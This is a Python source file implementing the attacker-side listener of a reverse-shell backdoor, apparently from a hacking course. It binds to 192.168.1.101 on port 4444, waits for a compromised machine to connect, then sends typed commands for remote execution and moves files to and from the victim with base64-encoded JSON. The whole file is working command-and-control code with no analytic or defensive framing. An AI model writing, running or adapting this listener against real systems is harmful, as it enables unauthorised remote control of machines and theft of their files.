import socket
import json
import base64

class Listener:
    def __init__(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("192.168.1.101", 4444))
        listener.listen(0)
        print("Waiting for connection")
        self.connection, address = listener.accept()
        print(self.connection.recv(1024))
        print("Got connection from " + str(address))

    def reliable_send(self,commands):
        json_data = json.dumps(commands)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "downloaded..!"

    def execute_command(self, commands):
        self.reliable_send(commands)
        if commands[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = raw_input(">>>")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_command(command)

                if command[0] == "download" and "Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error check the inputs"


            print(result)


my_listener = Listener()
my_listener.run()